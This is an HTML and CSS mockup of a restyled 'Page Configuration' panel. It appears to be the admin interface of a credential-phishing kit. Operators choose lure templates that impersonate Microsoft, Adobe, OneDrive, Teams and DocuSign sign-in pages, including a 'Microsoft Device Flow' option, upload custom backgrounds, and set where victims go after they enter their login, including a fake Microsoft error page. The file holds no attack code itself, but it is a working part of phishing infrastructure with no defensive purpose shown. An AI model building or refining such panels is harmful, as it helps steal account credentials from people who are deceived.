<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Link Config Redesign Test</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');

:root{
  --bg-0:#16063a;
  --bg-1:#fff;
  --bg-2:#0a0a0a;
  --panel:#000000;
  --border:#333333;
  --border-active:#00ff41;
  --text:#e0e0e0;
  --text-dim:#888888;
  --accent:#00ff41;
  --accent-dim:rgba(0, 255, 65, 0.2);
  --accent-2:#008F11;
  --accent-3:#b000ff;
  --danger:#ff3333;
  --glow:0 0 5px var(--accent);
  --font-mono: 'JetBrains Mono', 'Courier New', monospace;
  --c-info: #3b82f6;
}

*{box-sizing:border-box}
body{
  font-family:var(--font-mono);
  margin:0;
  padding:40px;
  background-color:var(--bg-0);
  background-image:url('https://images.pexels.com/photos/18147864/pexels-photo-18147864.jpeg');
  background-size:cover;
  background-position:center;
  background-repeat:no-repeat;
  background-attachment:fixed;
  color:var(--text);
}

/* ===== TERMINAL-STYLE LINK CONFIG ===== */

.link-config {
  border: 1px solid var(--border);
  background: rgba(0, 0, 0, 0.6);
  backdrop-filter: blur(4px);
  padding: 20px 24px;
}

/* --- Header --- */
.link-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 18px;
  padding-bottom: 10px;
  border-bottom: 1px solid var(--accent-2);
}

.link-title {
  display: flex;
  align-items: center;
  gap: 10px;
  font-size: 11px;
  font-weight: 700;
  color: var(--accent);
  text-transform: uppercase;
  letter-spacing: 2px;
}

.link-title::before {
  content: "▶";
  color: var(--accent);
  font-size: 10px;
  animation: blink 1.5s infinite;
}

@keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }

/* --- Two-column terminal grid --- */
.link-terminal-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 16px;
}

@media (max-width: 800px) {
  .link-terminal-grid {
    grid-template-columns: 1fr;
  }
}

.link-terminal-pane {
  border: 1px solid var(--border);
  background: rgba(0, 0, 0, 0.4);
}

.link-pane-header {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 8px 12px;
  background: rgba(0, 255, 65, 0.05);
  border-bottom: 1px solid var(--border);
  font-size: 9px;
  font-weight: 700;
  text-transform: uppercase;
  letter-spacing: 1.5px;
  color: var(--accent-2);
}

.link-pane-header::before {
  content: "◆";
  font-size: 8px;
  color: var(--accent);
}

.link-pane-body {
  padding: 14px 12px;
}

/* --- Field styles matching original aesthetic --- */
.link-field {
  display: flex;
  flex-direction: column;
  gap: 6px;
}

.link-field + .link-field {
  margin-top: 14px;
  padding-top: 14px;
  border-top: 1px solid rgba(255, 255, 255, 0.04);
}

.link-field label {
  font-size: 10px;
  font-weight: 700;
  color: var(--accent);
  text-transform: uppercase;
  letter-spacing: 1px;
}

.link-field input,
.link-field select {
  width: 100%;
  padding: 10px 12px;
  background: var(--bg-2);
  border: 1px solid var(--border);
  color: var(--accent);
  font-family: var(--font-mono);
  font-size: 13px;
  border-radius: 0;
  transition: all 0.2s;
}

.link-field input:focus,
.link-field select:focus {
  outline: none;
  border-color: var(--accent);
  box-shadow: var(--glow);
  background: rgba(0, 0, 0, 0.8);
}

.link-field input::placeholder {
  color: #000000 !important;
  opacity: 1;
}

.link-field button {
  padding: 10px 20px;
  border: 1px solid var(--accent);
  background: transparent;
  color: var(--accent);
  cursor: pointer;
  font-family: var(--font-mono);
  font-size: 12px;
  text-transform: uppercase;
  letter-spacing: 1px;
  transition: all 0.2s;
  border-radius: 0;
}

.link-field button:hover {
  background: var(--accent);
  color: #000;
  box-shadow: var(--glow);
}

/* Upload section specifics */
#uploadForm {
  display: flex;
  gap: 10px;
  align-items: center;
}

#uploadForm input[type="file"] {
  flex: 1;
  padding: 8px 10px;
  font-size: 12px;
}

details {
  margin-top: 8px;
  cursor: pointer;
}

details summary {
  color: var(--accent-2);
  font-size: 10px;
  text-transform: uppercase;
  letter-spacing: 1px;
  outline: none;
}

details .preview {
  margin-top: 8px;
  border: 1px solid var(--border);
  padding: 4px;
}

#uploadPreview {
  max-width: 100%;
  display: block;
}

/* Redirect URL input */
#redirectUrl {
  border: 1px solid rgba(0, 255, 65, 0.3) !important;
  box-shadow: 0 0 10px rgba(0, 255, 65, 0.05) !important;
}

/* Status badge */
.link-status-badge {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  font-size: 9px;
  text-transform: uppercase;
  letter-spacing: 1px;
  color: var(--text-dim);
}

.link-status-badge::before {
  content: "";
  width: 6px;
  height: 6px;
  background: var(--accent);
  box-shadow: var(--glow);
}
</style>
</head>
<body>

<div style="max-width:960px; margin:0 auto;">

  <!-- ===== REDESIGNED SECTION ===== -->
  <div class="link-config">
    <div class="link-header">
      <div class="link-title">Page Configuration</div>
      <span class="link-status-badge">Active</span>
    </div>

    <div class="link-terminal-grid">

      <!-- Pane 1: Page Template -->
      <div class="link-terminal-pane">
        <div class="link-pane-header">Template Settings</div>
        <div class="link-pane-body">

          <div class="link-field">
            <label for="template">Page Template</label>
            <select id="template">
              <option value="microsoft">Microsoft (Default)</option>
              <option value="adobe">Adobe</option>
              <option value="onedrive">OneDrive</option>
              <option value="teams_audio">Teams Audio</option>
              <option value="docusign">DocuSign</option>
              <option value="upload">Upload (Custom Background)</option>
              <option value="helper">Microsoft Device Flow (Helper)</option>
            </select>
          </div>

          <div class="link-field" id="adminUploadGroup" style="display:none">
            <label>Upload Background Image</label>
            <form id="uploadForm">
              <input type="file" name="image" accept="image/png,image/jpeg,image/jpg,image/webp" required>
              <button type="submit" id="uploadBtn">Upload</button>
            </form>
            <details>
              <summary>View Active Background</summary>
              <div class="preview">
                <img id="uploadPreview" src="" alt="Current background">
              </div>
            </details>
          </div>

        </div>
      </div>

      <!-- Pane 2: Redirect -->
      <div class="link-terminal-pane">
        <div class="link-pane-header">Redirect Configuration</div>
        <div class="link-pane-body">

          <div class="link-field">
            <label for="redirectType">Post-Login Redirect</label>
            <select id="redirectType">
              <option value="custom">Custom URL...</option>
              <option value="error_page">Error Page (Microsoft)</option>
            </select>
          </div>

          <div class="link-field" id="redirectUrlGroup">
            <label for="redirectUrl">Custom URL</label>
            <input id="redirectUrl" type="url" placeholder="https://example.com" style="display: none;">
          </div>

        </div>
      </div>

    </div>
  </div>
  <!-- ===== END REDESIGNED SECTION ===== -->

  <div style="margin-top: 24px; padding: 12px 16px; background: rgba(0,255,65,0.05); border: 1px solid var(--accent-2); font-size: 11px; color: var(--accent);">
    <span style="color:var(--accent-2)">//</span> All 8 IDs preserved: 
    <span style="color:var(--text-dim)">template</span>,
    <span style="color:var(--text-dim)">adminUploadGroup</span>,
    <span style="color:var(--text-dim)">uploadForm</span>,
    <span style="color:var(--text-dim)">uploadBtn</span>,
    <span style="color:var(--text-dim)">uploadPreview</span>,
    <span style="color:var(--text-dim)">redirectType</span>,
    <span style="color:var(--text-dim)">redirectUrlGroup</span>,
    <span style="color:var(--text-dim)">redirectUrl</span>
  </div>

</div>

</body>
</html>
